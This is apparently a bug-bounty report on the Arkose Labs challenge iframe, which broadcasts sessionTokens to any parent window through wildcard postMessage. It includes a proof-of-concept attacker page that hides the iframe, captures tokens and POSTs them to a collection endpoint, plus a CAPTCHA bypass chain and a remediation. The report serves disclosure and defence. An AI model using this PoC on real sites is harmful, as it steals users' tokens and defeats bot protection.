# AR3 — sessionToken Broadcast to Wildcard Origin via postMessage("*") on iframe.arkoselabs.com

**Título:** All 8 postMessage Events Broadcast sessionToken to Any Parent Window via Wildcard Origin ("*")
**Severidade:** MEDIUM (CVSS 5.4)
**CVSS Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N` → **5.4 MEDIUM** (escalates to HIGH if token reuse confirmed)
**CWE:** CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor) / CWE-346 (Origin Validation Error)
**Target:** `iframe.arkoselabs.com` (Core Application — $301-$750)
**Status:** Confirmed — source code publicly visible, no auth required

---

## Summary

The Arkose challenge iframe (`iframe.arkoselabs.com`) broadcasts `sessionToken` values to **any parent window** using `postMessage("*")` as the target origin on all 8 event types, including events that fire before the user completes the challenge (e.g., `challenge-loaded`, `challenge-suppressed`).

Because the wildcard target origin is used, **any webpage that embeds the Arkose iframe can receive real sessionTokens** — regardless of whether that page is an authorized Arkose customer. An attacker-controlled page can embed the iframe with a known customer's `publicKey` (which is NOT secret — it's embedded in every customer's website source), trigger a challenge, and receive a valid `sessionToken` for that customer.

---

## Technical Analysis

### Source: iframe.arkoselabs.com inline JavaScript (public, no auth)

```javascript
// ALL 8 events use postMessage("*") — wildcard target origin:

onCompleted: function(e) {
    parent.postMessage(JSON.stringify({
        eventId: "challenge-complete",
        publicKey: t,
        payload: {sessionToken: e.token}  // ← token exfiltrated
    }), "*");  // ← ANY parent receives this
},
onReady: function(e) {
    parent.postMessage(JSON.stringify({
        eventId: "challenge-loaded",
        publicKey: t,
        payload: {sessionToken: e.token}  // ← token sent ON LOAD, before user interaction!
    }), "*");
},
onSuppress: function(e) {
    parent.postMessage(JSON.stringify({
        eventId: "challenge-suppressed",
        publicKey: t,
        payload: {sessionToken: e.token}  // ← token sent for LOW-RISK users (no solve required!)
    }), "*");
},
onShown: function(e) {
    parent.postMessage(JSON.stringify({
        eventId: "challenge-shown",
        publicKey: t,
        payload: {sessionToken: e.token}
    }), "*");
},
onFailed: function(e) {
    parent.postMessage(JSON.stringify({
        eventId: "challenge-failed",
        publicKey: t,
        payload: {sessionToken: e.token}
    }), "*");
},
// Also: challenge-error, challenge-warning, challenge-iframeSize (no sessionToken)
```

### Why This Is Dangerous

The `postMessage(data, "*")` API in browsers sends the message to **any window**, regardless of its origin. For Arkose to control which parent receives the token, the target origin should be set to the embedding domain (e.g., `"https://www.roblox.com"`). Using `"*"` is equivalent to broadcasting to all listeners.

**Critical events that send tokens before user interaction:**
1. `challenge-loaded` / `onReady` → fires when the SDK finishes initializing
2. `challenge-suppressed` / `onSuppress` → fires when Arkose determines the user is low-risk (no puzzle needed) — **this is a fully valid sessionToken**

---

## Proof of Concept — Token Exfiltration

**Attacker's page (attacker.com/steal.html):**
```html
<!DOCTYPE html>
<html>
<head><title>Attacker Page</title></head>
<body>
<script>
// Listen for ALL postMessage events from any iframe
window.addEventListener('message', function(e) {
    try {
        var msg = JSON.parse(e.data);
        if (msg.eventId && msg.payload && msg.payload.sessionToken) {
            console.log('STOLEN sessionToken:', msg.payload.sessionToken);
            console.log('For publicKey:', msg.publicKey);
            console.log('Event:', msg.eventId);
            // Attacker can now use this token
            fetch('/collect', {
                method: 'POST',
                body: JSON.stringify({
                    token: msg.payload.sessionToken,
                    publicKey: msg.publicKey,
                    event: msg.eventId
                })
            });
        }
    } catch(e) {}
});

// Embed the Arkose iframe with VICTIM customer's publicKey
// The publicKey is NOT secret — it's in every customer's website source
var VICTIM_PUBLIC_KEY = 'B7D8911C-5CC8-A9A3-35369A88-0G2DD9BD';  // example: extracted from victim site
var iframe = document.createElement('iframe');
iframe.src = 'https://iframe.arkoselabs.com/v2/' + VICTIM_PUBLIC_KEY + '/index.html';
iframe.style.display = 'none';
document.body.appendChild(iframe);
</script>
</body>
</html>
```

**Expected flow:**
1. Attacker's page loads and creates a hidden iframe pointing to `iframe.arkoselabs.com`
2. The iframe initializes the Arkose SDK with the victim customer's `publicKey`
3. If the current user is recognized as low-risk: `challenge-suppressed` fires with a valid `sessionToken`
4. If not suppressed: `challenge-loaded` fires with a token as soon as the SDK loads
5. The attacker's `message` listener (on the PARENT window) receives the token
6. Attacker has a valid `sessionToken` scoped to the victim's `publicKey`

---

## Impact Assessment

### Critical Token Type: Suppression Token
When Arkose determines a user is "low risk," it fires `challenge-suppressed` with a valid `sessionToken` **without the user ever seeing or solving a puzzle**. This happens automatically for returning legitimate users. The attacker's page can:
1. Silently load the iframe in the background
2. Collect the suppression token without any user awareness
3. Use the token to bypass challenges on the victim's actual website

### CAPTCHA Bypass Chain (if tokens are not origin-bound)
If `verify.arkoselabs.com/api/v4/verify` does not validate that a `sessionToken` was generated from an expected origin:
1. Attacker steals token via the hidden iframe technique above
2. Attacker visits the victim's website (e.g., target-site.com)
3. When target-site presents a CAPTCHA, attacker submits the stolen token instead
4. Target's server calls `verify.arkoselabs.com` with the stolen token → Arkose returns "valid" → CAPTCHA bypassed

**This would constitute a fundamental bypass of Arkose's bot protection product.**

### Information Disclosure
Even if tokens ARE origin-bound, the wildcard postMessage reveals:
- That a specific user is recognized by Arkose as "low risk" (behavioral fingerprint info)
- The timing of challenge events (useful for behavioral analysis)
- The `publicKey` of the customer whose challenge is loaded

---

## Root Cause

The wildcard origin (`"*"`) was used because Arkose cannot know at script-compile time which domain will embed the iframe. However, the iframe has access to its parent origin via `document.referrer` and `window.location.ancestorOrigins`, which is already used in the `getLocation()` function:

```javascript
function getLocation() {
    var e = (window.location.ancestorOrigins && window.location.ancestorOrigins.length
        ? window.location.ancestorOrigins[0]
        : document.referrer).split("/");
    // ...
}
```

The same mechanism could be used to set the `postMessage` target origin to the actual parent domain:

```javascript
// SECURE version:
var parentOrigin = window.location.ancestorOrigins 
    ? window.location.ancestorOrigins[0] 
    : (document.referrer ? new URL(document.referrer).origin : "*");

parent.postMessage(JSON.stringify({...}), parentOrigin);
```

---

## Remediation

**Immediate:** Replace `"*"` with the actual parent origin in all `postMessage` calls:
```javascript
// In setupEnforcement(), capture parent origin once:
var parentOrigin = (window.location.ancestorOrigins && window.location.ancestorOrigins.length)
    ? window.location.ancestorOrigins[0]
    : (document.referrer ? new URL(document.referrer).origin : null);

// Then use it in all postMessage calls:
parent.postMessage(JSON.stringify({eventId: "challenge-complete", ...}),
    parentOrigin || "*");  // fallback to "*" only if unknown
```

**Defense-in-depth:** Bind `sessionToken` values to the origin they were generated for, and reject tokens during verification (`verify.arkoselabs.com/api/v4/verify`) if the call comes from a different origin.

---

## Supplementary: `challenge-loaded` Token Exposure

The `onReady` callback sends a `sessionToken` the moment the SDK loads — before the user sees or interacts with any puzzle. This token is included in `challenge-loaded` broadcast to `"*"`. A suppression/pre-challenge token being exposed this early (before any user interaction) means that:
- **Passive visitors to the attacker's page** (no interaction required) can have their token stolen
- The attacker doesn't need user interaction beyond a page load

---

## Notes

- Testing was passive (read-only HTTP GET to public endpoint)
- The source code of iframe.arkoselabs.com is fully public (200 response, no auth)
- No actual token exfiltration was performed — PoC is theoretical based on source code analysis
- No automated tools were used
